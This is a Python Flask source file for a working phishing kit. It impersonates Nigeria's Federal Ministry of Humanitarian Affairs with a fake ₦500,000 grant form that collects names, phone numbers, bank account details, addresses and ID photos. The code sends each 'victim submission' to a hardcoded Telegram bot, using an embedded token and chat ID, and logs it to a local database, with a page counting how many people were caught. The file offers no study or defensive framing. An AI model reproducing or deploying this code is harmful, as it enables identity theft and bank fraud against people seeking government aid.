from flask import Flask, request, render_template_string
import sqlite3, hashlib, os, requests, uuid
from datetime import datetime
from urllib.parse import urlparse

app = Flask(__name__)

# REPLACE THESE WITH YOUR VALUES
BOT_TOKEN = "8242963598:AAEhMbTy6FwYAL027cNDIH6WhNIVSyog_SA"
CHAT_ID = "8374631511"
BASE_URL = "https://government-taskfree.onrender.com"  # Render will give you this

# HTML Template (Nigerian Government Grant Form)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Federal Government Grant Portal</title>
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
        body{background:linear-gradient(135deg,#0d47a1,#1976d2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .form-container{background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);padding:40px;max-width:500px;width:100%;position:relative;overflow:hidden}
        .form-container::before{content:'';position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#00b894,#00cec9,#55a3ff)}
        .logo{text-align:center;margin-bottom:30px}
        .logo img{width:120px;height:auto}
        .logo h1{color:#0d47a1;font-size:28px;margin-bottom:5px;font-weight:700}
        .logo p{color:#666;font-size:14px;margin-bottom:20px}
        .form-group{position:relative;margin-bottom:25px}
        .form-group input,.form-group select,.form-group textarea{border:2px solid #e0e0e0;border-radius:12px;padding:15px 20px;font-size:16px;width:100%;transition:all 0.3s}
        .form-group input:focus,.form-group select:focus,.form-group textarea:focus{outline:none;border-color:#0d47a1;box-shadow:0 0 0 3px rgba(13,71,161,0.1)}
        .form-group label{display:block;margin-bottom:8px;color:#333;font-weight:600;font-size:14px}
        .btn-submit{background:linear-gradient(135deg,#00b894,#00cec9);color:white;border:none;border-radius:12px;padding:18px;font-size:18px;font-weight:700;cursor:pointer;transition:all 0.3s;width:100%;text-transform:uppercase;letter-spacing:1px}
        .btn-submit:hover{background:linear-gradient(135deg,#00a085,#00b894);transform:translateY(-2px);box-shadow:0 10px 25px rgba(0,184,148,0.3)}
        .photo-upload{margin-bottom:25px;text-align:center}
        .photo-upload input[type=file]{display:none}
        .photo-label{display:inline-block;background:#4a90e2;color:white;padding:12px 25px;border-radius:25px;cursor:pointer;font-weight:600;transition:all 0.3s;font-size:14px}
        .photo-label:hover{background:#357abd;transform:translateY(-2px)}
        .required::after{content:' *';color:#e74c3c}
        footer{text-align:center;margin-top:30px;padding-top:20px;border-top:1px solid #eee;color:#888;font-size:12px}
        @media (max-width:480px){.form-container{padding:30px 20px}}
    </style>
</head>
<body>
    <div class="form-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Nigeria_Flag.svg/1200px-Nigeria_Flag.svg.png" alt="Nigeria">
            <h1>Federal Ministry of Humanitarian Affairs</h1>
            <p>National Social Investment Programme (NSIP) - Grant Disbursement</p>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="session_id" value="{{ session_id }}">
            
            <div class="form-group">
                <label class="required">Full Name</label>
                <input type="text" name="name" required>
            </div>
            
            <div class="form-group">
                <label class="required">Phone Number</label>
                <input type="tel" name="phone" required>
            </div>
            
            <div class="form-group">
                <label class="required">WhatsApp Number</label>
                <input type="tel" name="whatsapp" required>
            </div>
            
            <div class="form-group">
                <label class="required">Bank Name</label>
                <select name="bank" required>
                    <option value="">Select Bank</option>
                    <option>GTBank</option><option>Zenith Bank</option><option>First Bank</option><option>Access Bank</option>
                    <option>UBA</option><option>Fidelity Bank</option><option>Union Bank</option><option>Stanbic IBTC</option>
                </select>
            </div>
            
            <div class="form-group">
                <label class="required">Account Number</label>
                <input type="text" name="account" required>
            </div>
            
            <div class="form-group">
                <label class="required">Address</label>
                <textarea name="address" rows="3" required></textarea>
            </div>
            
            <div class="form-group photo-upload">
                <label class="photo-label" for="photo">📸 Upload ID/Photo (Required)</label>
                <input type="file" id="photo" name="photo" accept="image/*" required>
            </div>
            
            <button type="submit" class="btn-submit">Submit Application → Receive ₦500,000 Grant</button>
        </form>
        
        <footer>
            <p>© 2026 Federal Government of Nigeria | Secure Portal</p>
        </footer>
    </div>
</body>
</html>
"""

def init_db():
    conn = sqlite3.connect('phish.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS submissions 
                 (id INTEGER PRIMARY KEY, session_id TEXT, name TEXT, phone TEXT, 
                  whatsapp TEXT, bank TEXT, account TEXT, address TEXT, 
                  photo_filename TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

def send_to_telegram(session_id, data, photo_path=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    text = f"""
🎣 <b>New Victim Submission</b> | Session: <code>{session_id}</code>

👤 <b>Name:</b> {data.get('name', 'N/A')}
📱 <b>Phone:</b> {data.get('phone', 'N/A')}
📲 <b>WhatsApp:</b> {data.get('whatsapp', 'N/A')}
🏦 <b>Bank:</b> {data.get('bank', 'N/A')}
💳 <b>Account:</b> <code>{data.get('account', 'N/A')}</code>
📍 <b>Address:</b> {data.get('address', 'N/A')}

⏰ <i>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>
    """
    
    payload = {'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}
    requests.post(url, json=payload)
    
    if photo_path:
        photo_url = f"{BASE_URL}/photos/{photo_path}"
        photo_payload = {'chat_id': CHAT_ID, 'photo': photo_url, 'caption': f"🆔 Victim Photo | Session: {session_id}"}
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=photo_payload)

@app.route('/', methods=['GET'])
def new_phish():
    session_id = str(uuid.uuid4())[:8]
    return render_template_string(HTML_TEMPLATE, session_id=session_id)

@app.route('/', methods=['POST'])
def submit_phish():
    session_id = request.form['session_id']
    data = request.form
    
    photo_path = None
    if 'photo' in request.files:
        photo = request.files['photo']
        if photo.filename:
            photo_filename = f"{session_id}_{photo.filename}"
            photo.save(f"static/photos/{photo_filename}")
            photo_path = photo_filename
    
    send_to_telegram(session_id, data, photo_path)
    
    conn = sqlite3.connect('phish.db')
    c = conn.cursor()
    c.execute("INSERT INTO submissions (session_id, name, phone, whatsapp, bank, account, address, photo_filename, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (session_id, data['name'], data['phone'], data['whatsapp'], data['bank'], data['account'], data['address'], photo_path, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return '''
    <!DOCTYPE html>
    <html><head><meta charset="utf-8"><title>Success</title></head>
    <body style="background:#00b894;color:white;font-family:sans-serif;padding:50px;text-align:center;">
        <h1>✅ Application Submitted Successfully!</h1>
        <p>Your ₦500,000 grant will be disbursed within 24-48 hours.</p>
        <p>Check your bank account soon!</p>
    </body></html>
    '''

@app.route('/stats')
def stats():
    conn = sqlite3.connect('phish.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM submissions")
    total = c.fetchone()[0]
    conn.close()
    return f"<h1>📊 Stats</h1><p>Total submissions: {total}</p>"

if __name__ == '__main__':
    os.makedirs('static/photos', exist_ok=True)
    init_db()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
